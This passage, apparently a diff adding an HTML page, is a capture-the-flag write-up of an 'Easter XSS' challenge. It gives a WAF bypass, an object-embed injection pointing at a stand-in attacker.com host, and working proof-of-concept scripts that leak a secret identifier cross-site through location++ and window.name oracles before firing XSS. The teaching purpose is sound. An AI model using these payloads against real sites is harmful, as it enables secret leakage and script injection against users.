+    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre><p><strong><span>Exposing the identifier allows for forgery of arbitrary HTML from any window context.</span></strong></p><h2 id="Waf-bypass" data-id="Waf-bypass" style=""><a class="anchor hidden-xs" href="#Waf-bypass" title="Waf-bypass"><span class="octicon octicon-link"></span></a><span>Waf bypass</span></h2><ol>
+<li><span>The WAF isn’t very restrictive and it allows for injection of </span><code>onXXX</code><span> events. However, it restricts characters appearing there to ones outside of the following: </span><code>" ' ` [ ] { } ( ) =</code><span>. This is intended to prevent arbitrary code execution, though the charset is not that restrictive.</span></li>
+<li><span>It is possible to inject </span><code>&lt;object data=//atacker.com&gt;&lt;/object&gt;</code><span> to embed an external site.</span></li>
+</ol><h2 id="The-challenge-idea" data-id="The-challenge-idea" style=""><a class="anchor hidden-xs" href="#The-challenge-idea" title="The-challenge-idea"><span class="octicon octicon-link"></span></a><span>The challenge idea</span></h2><p><span>The idea of the challenge comes from a real WAF bypass I discovered. Although it doesn’t seem that arbitrary XSS would be possible from the allowed characters, an attacker could inject the following condition</span></p><blockquote>
+<p><code>identifier&lt;variable?leak_true:leak_false</code></p>
+</blockquote><p><span>So, the real goal of the challenge is to somehow </span><strong><span>leak the identifier cross-site</span></strong><span>.</span></p><p><span>One can notice that even though standard assignments are forbidden (because of </span><code>=</code><span>) it is still possible to assign values with either </span><code>++</code><span> or </span><code>--</code><span> which more or less work like </span><code>+=1</code><span> and </span><code>-=1</code><span>.</span></p><h2 id="Naive-oracle" data-id="Naive-oracle" style=""><a class="anchor hidden-xs" href="#Naive-oracle" title="Naive-oracle"><span class="octicon octicon-link"></span></a><span>Naive oracle</span></h2><p><span>Let </span><code>attacker.com/poc.html</code><span> be the following simple page:</span></p><pre><code class="html hljs"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">name</span>=<span class="hljs-string">i_true</span> 
+        <span class="hljs-attr">src</span>=<span class="hljs-string">//challenge-0421.intigriti.io/style.css</span>
+        <span class="hljs-attr">onload</span>=<span class="hljs-string">process(true)</span>
+&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">name</span>=<span class="hljs-string">i_false</span> 
+        <span class="hljs-attr">src</span>=<span class="hljs-string">//challenge-0421.intigriti.io/style.css</span>
+        <span class="hljs-attr">onload</span>=<span class="hljs-string">process(false)</span>
+&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>
+  function process(value){
+    /* do something with the value */
+  }
+<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</code></pre><p><span>Then by injecting this onto a challenge page via:</span></p><pre><code class="html hljs">&lt;object name=poc 
+        data=<span class="hljs-comment">//attacker.com/poc.html</span>
+        onload=identifier&lt;/t/.source?top.poc.i_true.location++:top.poc.i_false.location++
+&gt;&lt;/object&gt;
+</code></pre><p><span>depending on the result of the comparison, either iframe </span><code>i_true</code><span> or </span><code>i_false</code><span> will be reloaded. That is because </span><code>top.poc.i_true.location++</code><span> will assign a URL </span><code>//challenge-0421.intigriti.io/NaN</code><span> to the iframe.</span></p><p><em><span>Note that it is important that the frames are same-origin otherwise the redirect attempt would fail.</span></em></p><h2 id="Parameterized-oracle" data-id="Parameterized-oracle" style=""><a class="anchor hidden-xs" href="#Parameterized-oracle" title="Parameterized-oracle"><span class="octicon octicon-link"></span></a><span>Parameterized oracle</span></h2><p><span>The naive oracle from the previous section only yields boolean value based on a constant string </span><code>'t'</code><span> written as </span><code>identifier&lt;/t/.source</code><span>. Let’s try to parametrize the equation so it could potentially be possible to control each comparison. To smuggle the data we could for example use </span><code>location.hash</code><span>. The same equation could be then presented as </span><code>/#/.source+identifier&lt;location.hash</code><span> if the URL fragment is set to </span><code>#t</code><span>.</span></p><p><em><span>Appending </span><code>#</code><span> before the identifier is required because </span><code>location.hash</code><span> starts with that character</span></em></p><p><span>With that, all we need to is repeat the process somehow and control </span><code>location.hash</code><span> in each iteration.</span></p><h3 id="Visualization-on-an-example" data-id="Visualization-on-an-example" style=""><a class="anchor hidden-xs" href="#Visualization-on-an-example" title="Visualization-on-an-example"><span class="octicon octicon-link"></span></a><span>Visualization on an example</span></h3><p><span>Let’s visualize the technique on this simple example for an identifier </span><code>012</code><span>.</span></p><pre><code>'#012' &lt; '#0' (false)
+'#012' &lt; '#1 (true) -&gt; we can deduce that the first character is therefore 1
+
+'#012' &lt; '#00' (false)
+'#012' &lt; '#01' (false)
+'#012' &lt; '#02' (true) -&gt; the second character is 1
+
+'#012' &lt; '#010' (false)
+'#012' &lt; '#011' (false)
+'#012' &lt; '#012' (false)
+'#012' &lt; '#013' (true) -&gt; the third character is 2
+</code></pre><p><span>With repeating the process we were able to leak the full identifier.</span></p><h2 id="Custom-loop" data-id="Custom-loop" style=""><a class="anchor hidden-xs" href="#Custom-loop" title="Custom-loop"><span class="octicon octicon-link"></span></a><span>Custom loop</span></h2><p><span>With the snippet from </span><code>//attacker.com/poc.html</code><span> we can easily trigger as many iterations as we want by simply doing </span><code>location.reload()</code><span> after processing the data. That is because with each reload of the object </span><code>onload</code><span> event triggers in the injected HTML code. All we need is to store already processed data somewhere (e.g. sessionStorage).</span></p><h2 id="Hints-explained" data-id="Hints-explained" style=""><a class="anchor hidden-xs" href="#Hints-explained" title="Hints-explained"><span class="octicon octicon-link"></span></a><span>Hints explained</span></h2><p><span>Before going to the naive solution, let’s have a look at the released hints.</span></p><blockquote>
+<p><span>First hint: find the objective!</span></p>
+</blockquote><p><span>This was a hint towards </span><code>&lt;object&gt;</code><span> and figuring that the objective is to leak the identifier.</span></p><blockquote>
+<p><span>Time for another hint! Where to smuggle data?</span></p>
+</blockquote><p><span>This was a little bit too early hint but it was hinting towards both </span><code>&lt;object data</code><span> and reusing some properties such as </span><code>location.hash</code><span> at later steps.</span></p><blockquote>
+<p><span>Time for another tip! One bite after another!</span></p>
+</blockquote><p><span>This tip was about leaking the identifier one byte after another.</span></p><blockquote>
+<p><span>Here’s an extra tip: ++ is also an assignment</span></p>
+</blockquote><p><span>It was the most direct hint towards </span><code>++</code><span>  assignment which helps leak data cross-site.</span></p><blockquote>
+<p><span>“Behind a Greater Oracle there stands one great Identity” (leak it)</span></p>
+</blockquote><p><span>Construct a comparison oracle to leak the identifier.</span></p><blockquote>
+<p><span>Tipping time! Goal &lt; object(ive)</span></p>
+</blockquote><p><span>It’s a double hint for </span><code>identifier &lt; something</code><span> and to use </span><code>&lt;object</code></p><blockquote>
+<p><span>Another hint: you might need to unload a custom loop!</span></p>
+</blockquote><p><span>Create an artificial loop with </span><code>&lt;object onload=</code><span> by reloading the object.</span></p><h2 id="Naive-solution" data-id="Naive-solution" style=""><a class="anchor hidden-xs" href="#Naive-solution" title="Naive-solution"><span class="octicon octicon-link"></span></a><span>Naive solution</span></h2><p><span>By putting all together we can draft a simple payload of leaking the identifier.</span></p><pre><code class="html hljs">&lt;iframe name=i_true 
+        src=<span class="hljs-comment">//easterxss.terjanq.me/style.css</span>
+        onload=process(<span class="hljs-keyword">this</span>,<span class="hljs-literal">true</span>)
+&gt;&lt;/iframe&gt;
+&lt;iframe name=i_false 
+        src=<span class="hljs-comment">//easterxss.terjanq.me/style.css</span>
+        onload=process(<span class="hljs-keyword">this</span>,<span class="hljs-literal">false</span>)
+&gt;&lt;/iframe&gt;
+&lt;script&gt;
+  <span class="hljs-comment">// add ~ to the alphabet so the poc works. without it, z would be never detected</span>
+  <span class="hljs-keyword">const</span> alph = <span class="hljs-string">'0123456789abcdefghijklmnopqrstuvwxyz~'</span>
+
+  <span class="hljs-comment">// store current index and current identifier in sessionStorage</span>
+  <span class="hljs-keyword">let</span> cur_char = parseInt(sessionStorage.getItem(<span class="hljs-string">'current'</span>)) || <span class="hljs-number">0</span>;
+  <span class="hljs-keyword">let</span> cur_identifier = sessionStorage.getItem(<span class="hljs-string">'identifier'</span>) || <span class="hljs-string">''</span>;
+  
+  <span class="hljs-comment">// generate payload</span>
+  <span class="hljs-keyword">const</span> top_url = <span class="hljs-string">'https://easterxss.terjanq.me/?error='</span> + encodeURIComponent(
+    `&lt;<span class="hljs-built_in">object</span> name=poc 
+            data=${location.href}
+            onload=/<span class="hljs-meta">#/.source+identifier&lt;location.hash?top.poc.i_true.location++:top.poc.i_false.location++</span>
+    &gt;&lt;/<span class="hljs-built_in">object</span>&gt;`.replace(/\s+/g,<span class="hljs-string">' '</span>));
+
+  <span class="hljs-comment">// start payload</span>
+  <span class="hljs-keyword">if</span>(top === window){
+      sessionStorage.setItem(<span class="hljs-string">'current'</span>, <span class="hljs-number">0</span>);
+      sessionStorage.setItem(<span class="hljs-string">'identifier'</span>, <span class="hljs-string">''</span>);
+      location = top_url + <span class="hljs-string">'#0'</span>;
+  }
+
+  <span class="hljs-function">function <span class="hljs-title">process</span>(<span class="hljs-params">ifr, <span class="hljs-keyword">value</span></span>)</span>{
+    <span class="hljs-comment">// Skip first onload</span>
+    <span class="hljs-keyword">if</span>(!ifr.loaded) {
+        ifr.loaded = <span class="hljs-literal">true</span> 
+        <span class="hljs-keyword">return</span>;
+    }
+    <span class="hljs-comment">// first less value, means the previous was matched character</span>
+    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">value</span> === <span class="hljs-literal">true</span>){
+        <span class="hljs-comment">// If cur_char is 0, it means that the strings are equal.</span>
+        <span class="hljs-keyword">if</span>(cur_char === <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> solve(cur_identifier);
+        cur_identifier += alph[cur_char<span class="hljs-number">-1</span>];
+        console.log(cur_identifier)
+        <span class="hljs-comment">// store new identifier in sessionStorage and reset cur_char</span>
+        cur_char = <span class="hljs-number">0</span>;
+        sessionStorage.setItem(<span class="hljs-string">'identifier'</span>, cur_identifier)
+    }<span class="hljs-keyword">else</span>{
+        <span class="hljs-comment">// try next character</span>
+        cur_char += <span class="hljs-number">1</span>;
+    }
+    <span class="hljs-comment">// update sessionStorage, change challenge's URL fragment to check next</span>
+    <span class="hljs-comment">// characters, and reload the window to trigger onload event again and again</span>
+    sessionStorage.setItem(<span class="hljs-string">'current'</span>, cur_char);
+    top.location = top_url + <span class="hljs-string">'#'</span> + cur_identifier + alph[cur_char]
+    location.reload();
+  }
+
+  <span class="hljs-comment">// with leaked identifier execute full blown XSS</span>
+  <span class="hljs-function">function <span class="hljs-title">solve</span>(<span class="hljs-params">identifier</span>)</span> {
+        top.postMessage({
+            type: <span class="hljs-string">'waf'</span>,
+            identifier,
+            str: `&lt;iframe onload=<span class="hljs-string">"alert(/this_is_flag/)"</span>&gt;`,
+            safe: <span class="hljs-literal">true</span>
+        }, <span class="hljs-string">'*'</span>)
+    }
+  
+&lt;/script&gt;
+</code></pre><p><span>However, this is slow and might take a few minutes to finish (here with a fast connection it takes 30-60 seconds). But if someone submitted a similar solution, it would most likely be accepted. The above code be accessed here: </span><a href="https://easterxss.terjanq.me/naive-solution.html" target="_blank" rel="noopener"><span>https://easterxss.terjanq.me/naive-solution.html</span></a><span>.</span></p><p><span>The overall goal of the challenge was to improve the efficiency of the naive solution.</span></p><h2 id="Better-loop" data-id="Better-loop" style=""><a class="anchor hidden-xs" href="#Better-loop" title="Better-loop"><span class="octicon octicon-link"></span></a><span>Better loop</span></h2><p><span>Although </span><code>location.reload()</code><span> was a nice trick to trigger many onload events, it’s resource costly. Each reload is rather slow. To fix that, one can use two objects:</span></p><pre><code class="html hljs"><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">name</span>=<span class="hljs-string">poc</span> <span class="hljs-attr">data</span>=<span class="hljs-string">//attacker.com/poc.html</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">name</span>=<span class="hljs-string">xss</span> <span class="hljs-attr">src</span>=<span class="hljs-string">//attacker.com/empty.html</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">XSS</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span>
+</code></pre><p><span>and instead of calling </span><code>location.reload()</code><span> we could call</span><code>top.xss.location='//attacker.com/empty.html'</code><span> to load a resource from the borwser cache very efficently, or even better, load an empty blob which also has the origin </span><code>attacker.com</code><span>:</span></p><pre><code class="js hljs">top.xss.location = URL.createObjectURL(<span class="hljs-keyword">new</span> Blob([], { <span class="hljs-built_in">type</span>: <span class="hljs-string">'text/html'</span>}));
+</code></pre><p><span>The above technique should trigger </span><code>onload</code><span> event almost instantly.</span></p><h2 id="More-iframes" data-id="More-iframes" style=""><a class="anchor hidden-xs" href="#More-iframes" title="More-iframes"><span class="octicon octicon-link"></span></a><span>More iframes</span></h2><p><span>Instead of only using </span><code>true</code><span> and </span><code>false</code><span> iframes, we could use 36 iframes, each corresponding to a different character in its name, e.g. </span><code>i_[character]</code><span>. Then calling </span><code>top.poc.i_t.location++</code><span> leaks the information about the character </span><code>t</code><span> via redirecting a specific iframe. To make it work we need to tweak oracle a little bit and use tenary tricks to perform 36 checks. Let’s see how this could be done.</span></p><pre><code class="js hljs"><span class="hljs-regexp">/##/</span>.source + identifier &lt; location.hash + <span class="hljs-regexp">/0/</span>.source &amp;&amp; !top.x.i_0.location++ &amp;&amp; t.j,
+<span class="hljs-regexp">/##/</span>.source + identifier &lt; location.hash + <span class="hljs-regexp">/1/</span>.source &amp;&amp; !top.x.i_1.location++ &amp;&amp; t.j,
+...,
+<span class="hljs-regexp">/##/</span>.source + identifier &lt; location.hash + <span class="hljs-regexp">/z/</span>.source &amp;&amp; !top.x.i_z.location++ &amp;&amp; t.j
+</code></pre><p><span>The trick is that we have 36 expressions separated with </span><code>,</code><span> which makes them execute one after another.</span></p><p><span>If the equation </span><code>/##/.source+identifier&lt;location.hash+/0/.source</code><span> is satisfied then </span><code>top.x.i_0.location++</code><span> triggers, then </span><code>t.j</code><span> throws an exception preventing further execution of all the following expressions. Else, the next expression is tested until the equation is satisfied. That way exactly one call is made for every character.</span></p><p><span>Check out </span><a href="http://terjanq.me/l-solution.html" target="_blank" rel="noopener"><span>http://terjanq.me/l-solution.html</span></a><span> (</span><a href="https://github.com/terjanq/Easter-xss-challenge/blob/main/naive-solution.html" target="_blank" rel="noopener"><span>source</span></a><span>) to see the PoC in action. This solution was enough to solve the challenge while respecting all the rules.</span></p><h2 id="Let’s-go-faster" data-id="Let’s-go-faster" style=""><a class="anchor hidden-xs" href="#Let’s-go-faster" title="Let’s-go-faster"><span class="octicon octicon-link"></span></a><span>Let’s go faster</span></h2><p><span>The solution with using </span><code>location++</code><span> is dependent on the network speed and for people with a slower connection, 10 seconds might not be enough to finish execution (though it takes less than 3s for me). To remove network jitter I came up with a neat technique that instead does </span><code>name++</code><span>. For example, </span><code>top.poc.i_3.name++</code><span> would change the iframe’s name to </span><code>NaN</code><span>.</span></p><h3 id="But-how-to-detect-the-name-change" data-id="But-how-to-detect-the-name-change" style=""><a class="anchor hidden-xs" href="#But-how-to-detect-the-name-change" title="But-how-to-detect-the-name-change"><span class="octicon octicon-link"></span></a><span>But how to detect the name change?</span></h3><p><span>The name change can be detected through repeatedly, for each iframe, checking if every iframe is still accessible via </span><code>window['i_[char]']</code><span>. If it is not, that means that </span><code>top.poc.i_[char].name++</code><span> was called. All that is left is to restore the iframe via injecting a new iframe with the original name and remove the changed one for performance benefits.</span></p><p><span>This was implemented in </span><a href="https://easterxss.terjanq.me/n-solution.html" target="_blank" rel="noopener"><span>https://easterxss.terjanq.me/n-solution.html</span></a><span> (</span><a href="https://github.com/terjanq/Easter-xss-challenge/blob/main/n-solution.html" target="_blank" rel="noopener"><span>source</span></a><span>)</span></p><h2 id="Dark-Arts-solution" data-id="Dark-Arts-solution" style=""><a class="anchor hidden-xs" href="#Dark-Arts-solution" title="Dark-Arts-solution"><span class="octicon octicon-link"></span></a><span>Dark Arts solution</span></h2><p><span>It’s also possible to solve the challenge without any popups nor iframes. The trick is really neat and relies on smuggling the data into </span><code>top.name</code><span>.</span></p><p><span>Let’s look at the following expressions:</span></p><pre><code class="js hljs">location.hash + /0/.<span class="hljs-built_in">source</span> &lt; /<span class="hljs-comment">##/.source + identifier &amp;&amp; ++top.name,</span>
+location.hash + /1/.<span class="hljs-built_in">source</span> &lt; /<span class="hljs-comment">##/.source + identifier &amp;&amp; ++top.name,</span>
+...,
+location.hash + /z/.<span class="hljs-built_in">source</span> &lt; /<span class="hljs-comment">##/.source + identifier &amp;&amp; ++top.name</span>
+</code></pre><p><span>If each equation is satisfied then </span><code>++top.name</code><span> is called which increases the top window’s name by 1. If we initially assign </span><code>window.name=0</code><span> then after each iteration, the number will indicate which character was leaked. Then, by repeating the process, we can leak the whole identifier.</span></p><h3 id="But-how-to-read-the-name" data-id="But-how-to-read-the-name" style=""><a class="anchor hidden-xs" href="#But-how-to-read-the-name" title="But-how-to-read-the-name"><span class="octicon octicon-link"></span></a><span>But how to read the name??</span></h3><p><span>Although it’s not possible to directly read </span><code>window.name</code><span> of a cross-origin resource without reloading the window, there is this a neat trick of brute-guessing it.</span></p><p><span>Let’s look at: </span><code>window.open('//url', 17)</code><span>. It tries to open a new popup with the name </span><code>17</code><span>. But what happens if there is already a window with such a name? Then it attempts to reload it instead. And it’s possible to detect whether there was attempted navigation or a popup.</span></p><p><em><span>TL;DR:</span></em><span> use a sandboxed iframe to call </span><code>window.open()</code><span>, that way popups will be blocked, but set </span><code>sandbox=allow-top-navigation</code><span> to allow top navigation changes. To prevent real navigation from happening one can use an unknown protocol such as </span><code>xxxx://non-existent'</code><span>. Then the dection could look like:</span></p><pre><code class="js hljs"><span class="hljs-function"><span class="hljs-keyword">async</span> function <span class="hljs-title">getTopName</span>(<span class="hljs-params"></span>)</span> {
+    <span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>;
+    <span class="hljs-comment">// it's just magic. tl;dr chrome and firefox work differently </span>
+    <span class="hljs-comment">// but this polyglot works for both;</span>
+    <span class="hljs-keyword">for</span> (; i &lt; alph.length + <span class="hljs-number">1</span>; i++) {
+        <span class="hljs-keyword">let</span> res = <span class="hljs-keyword">await</span> (<span class="hljs-keyword">async</span> () =&gt; {
+            <span class="hljs-keyword">let</span> x;
+            <span class="hljs-keyword">try</span> {
+                <span class="hljs-comment">// shouldn't trigger new navigation</span>
+                x = testFrame.open(<span class="hljs-string">'xxxx://no-trigger'</span>, i + lastValue);
+                <span class="hljs-comment">// this is for firefox</span>
+                <span class="hljs-keyword">if</span> (x !== <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+                <span class="hljs-keyword">return</span>;
+            } catch (e) {}
+        })();
+        <span class="hljs-keyword">if</span> (res) <span class="hljs-keyword">break</span>;
+    }
+    <span class="hljs-keyword">return</span> i + lastValue;
+}
+</code></pre><p><span>The full-blown PoC is available here: </span><a href="https://easterxss.terjanq.me/t-solution.html" target="_blank" rel="noopener"><span>https://easterxss.terjanq.me/t-solution.html</span></a><span> (</span><a href="https://github.com/terjanq/Easter-xss-challenge/blob/main/n-solution.html" target="_blank" rel="noopener"><span>source</span></a><span>)</span></p></div>
+    <div class="ui-toc dropup unselectable hidden-print" style="display:none;">
+        <div class="pull-right dropdown">
+            <a id="tocLabel" class="ui-toc-label btn btn-default" data-toggle="dropdown" href="#" role="button" aria-haspopup="true" aria-expanded="false" title="Table of content">
+                <i class="fa fa-bars"></i>
+            </a>
+            <ul id="ui-toc" class="ui-toc-dropdown dropdown-menu" aria-labelledby="tocLabel">
+                <div class="toc"><ul class="nav">
+<li class=""><a href="#Easter-XSS-by-terjanq" title="Easter XSS by @terjanq">Easter XSS by @terjanq</a><ul class="nav">
+<li class=""><a href="#A-quick-look" title="A quick look">A quick look</a></li>
+<li><a href="#TLDR-solutions" title="TL;DR solutions">TL;DR solutions</a></li>
+<li class=""><a href="#How-does-HTML-injection-work" title="How does HTML injection work">How does HTML injection work</a></li>
+<li><a href="#Waf-bypass" title="Waf bypass">Waf bypass</a></li>
+<li><a href="#The-challenge-idea" title="The challenge idea">The challenge idea</a></li>
+<li class=""><a href="#Naive-oracle" title="Naive oracle">Naive oracle</a></li>
+<li class=""><a href="#Parameterized-oracle" title="Parameterized oracle">Parameterized oracle</a><ul class="nav">
+<li class=""><a href="#Visualization-on-an-example" title="Visualization on an example">Visualization on an example</a></li>
+</ul>
+</li>
+<li><a href="#Custom-loop" title="Custom loop">Custom loop</a></li>
+<li class=""><a href="#Hints-explained" title="Hints explained">Hints explained</a></li>
+<li class=""><a href="#Naive-solution" title="Naive solution">Naive solution</a></li>
+<li class=""><a href="#Better-loop" title="Better loop">Better loop</a></li>
+<li class=""><a href="#More-iframes" title="More iframes">More iframes</a></li>
+<li><a href="#Let’s-go-faster" title="Let’s go faster">Let’s go faster</a><ul class="nav">
+<li><a href="#But-how-to-detect-the-name-change" title="But how to detect the name change?">But how to detect the name change?</a></li>
+</ul>
+</li>
+<li><a href="#Dark-Arts-solution" title="Dark Arts solution">Dark Arts solution</a><ul class="nav">
+<li><a href="#But-how-to-read-the-name" title="But how to read the name??">But how to read the name??</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</div><div class="toc-menu"><a class="expand-toggle" href="#">Expand all</a><a class="back-to-top" href="#">Back to top</a><a class="go-to-bottom" href="#">Go to bottom</a></div>
+            </ul>
+        </div>
+    </div>
+    <div id="ui-toc-affix" class="ui-affix-toc ui-toc-dropdown unselectable hidden-print" data-spy="affix" style="top:17px;display:none;" null null>
+        <div class="toc"><ul class="nav">
+<li class=""><a href="#Easter-XSS-by-terjanq" title="Easter XSS by @terjanq">Easter XSS by @terjanq</a><ul class="nav">
+<li class=""><a href="#A-quick-look" title="A quick look">A quick look</a></li>
+<li><a href="#TLDR-solutions" title="TL;DR solutions">TL;DR solutions</a></li>
+<li class=""><a href="#How-does-HTML-injection-work" title="How does HTML injection work">How does HTML injection work</a></li>
+<li><a href="#Waf-bypass" title="Waf bypass">Waf bypass</a></li>
+<li><a href="#The-challenge-idea" title="The challenge idea">The challenge idea</a></li>
+<li class=""><a href="#Naive-oracle" title="Naive oracle">Naive oracle</a></li>
+<li class=""><a href="#Parameterized-oracle" title="Parameterized oracle">Parameterized oracle</a><ul class="nav">
+<li class=""><a href="#Visualization-on-an-example" title="Visualization on an example">Visualization on an example</a></li>
+</ul>
+</li>
+<li><a href="#Custom-loop" title="Custom loop">Custom loop</a></li>
+<li class=""><a href="#Hints-explained" title="Hints explained">Hints explained</a></li>
+<li class=""><a href="#Naive-solution" title="Naive solution">Naive solution</a></li>
+<li class=""><a href="#Better-loop" title="Better loop">Better loop</a></li>
+<li class=""><a href="#More-iframes" title="More iframes">More iframes</a></li>
+<li><a href="#Let’s-go-faster" title="Let’s go faster">Let’s go faster</a><ul class="nav">
+<li><a href="#But-how-to-detect-the-name-change" title="But how to detect the name change?">But how to detect the name change?</a></li>
+</ul>
+</li>
+<li><a href="#Dark-Arts-solution" title="Dark Arts solution">Dark Arts solution</a><ul class="nav">
+<li><a href="#But-how-to-read-the-name" title="But how to read the name??">But how to read the name??</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</div><div class="toc-menu"><a class="expand-toggle" href="#">Expand all</a><a class="back-to-top" href="#">Back to top</a><a class="go-to-bottom" href="#">Go to bottom</a></div>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js" integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha256-U5ZEeKfGNOja007MMD3YBI0A3OSZOQbeG6z2f2Y0hu8=" crossorigin="anonymous" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gist-embed/2.6.0/gist-embed.min.js" integrity="sha256-KyF2D6xPIJUW5sUDSs93vWyZm+1RzIpKCexxElmxl8g=" crossorigin="anonymous" defer></script>
+    <script>
+        var markdown = $(".markdown-body");
+        //smooth all hash trigger scrolling
+        function smoothHashScroll() {
+            var hashElements = $("a[href^='#']").toArray();
+            for (var i = 0; i < hashElements.length; i++) {
+                var element = hashElements[i];
+                var $element = $(element);
+                var hash = element.hash;
+                if (hash) {
+                    $element.on('click', function (e) {
+                        // store hash
+                        var hash = this.hash;
+                        if ($(hash).length <= 0) return;
+                        // prevent default anchor click behavior
+                        e.preventDefault();
+                        // animate
+                        $('body, html').stop(true, true).animate({
+                            scrollTop: $(hash).offset().top
+                        }, 100, "linear", function () {
+                            // when done, add hash to url
+                            // (default click behaviour)
+                            window.location.hash = hash;
+                        });
+                    });
+                }
+            }
+        }
+
+        smoothHashScroll();
+        var toc = $('.ui-toc');
+        var tocAffix = $('.ui-affix-toc');
+        var tocDropdown = $('.ui-toc-dropdown');
+        //toc
+        tocDropdown.click(function (e) {
+            e.stopPropagation();
+        });
+
+        var enoughForAffixToc = true;
+
+        function generateScrollspy() {
+            $(document.body).scrollspy({
+                target: ''
+            });
+            $(document.body).scrollspy('refresh');
+            if (enoughForAffixToc) {
+                toc.hide();
+                tocAffix.show();
+            } else {
+                tocAffix.hide();
+                toc.show();
+            }
+            $(document.body).scroll();
+        }
+
+        function windowResize() {
+            //toc right
+            var paddingRight = parseFloat(markdown.css('padding-right'));
+            var right = ($(window).width() - (markdown.offset().left + markdown.outerWidth() - paddingRight));
+            toc.css('right', right + 'px');
+            //affix toc left
+            var newbool;
+            var rightMargin = (markdown.parent().outerWidth() - markdown.outerWidth()) / 2;
+            //for ipad or wider device
+            if (rightMargin >= 133) {
+                newbool = true;
+                var affixLeftMargin = (tocAffix.outerWidth() - tocAffix.width()) / 2;
+                var left = markdown.offset().left + markdown.outerWidth() - affixLeftMargin;
+                tocAffix.css('left', left + 'px');
+            } else {
+                newbool = false;
+            }
+            if (newbool != enoughForAffixToc) {
+                enoughForAffixToc = newbool;
+                generateScrollspy();
+            }
+        }
+        $(window).resize(function () {
+            windowResize();
+        });
+        $(document).ready(function () {
+            windowResize();
+            generateScrollspy();
+        });
+
+        //remove hash
+        function removeHash() {
+            window.location.hash = '';
+        }
+
+        var backtotop = $('.back-to-top');
+        var gotobottom = $('.go-to-bottom');
+
+        backtotop.click(function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+            if (scrollToTop)
+                scrollToTop();
+            removeHash();
+        });
+        gotobottom.click(function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+            if (scrollToBottom)
+                scrollToBottom();
+            removeHash();
+        });
+
+        var toggle = $('.expand-toggle');
+        var tocExpand = false;
+
+        checkExpandToggle();
+        toggle.click(function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+            tocExpand = !tocExpand;
+            checkExpandToggle();
+        })
+
+        function checkExpandToggle () {
+            var toc = $('.ui-toc-dropdown .toc');
+            var toggle = $('.expand-toggle');
+            if (!tocExpand) {
+                toc.removeClass('expand');
+                toggle.text('Expand all');
+            } else {
+                toc.addClass('expand');
+                toggle.text('Collapse all');
+            }
+        }
+
+        function scrollToTop() {
+            $('body, html').stop(true, true).animate({
+                scrollTop: 0
+            }, 100, "linear");
+        }
+
+        function scrollToBottom() {
+            $('body, html').stop(true, true).animate({
+                scrollTop: $(document.body)[0].scrollHeight
+            }, 100, "linear");
+        }
+    </script>
+</body>
+
+</html>
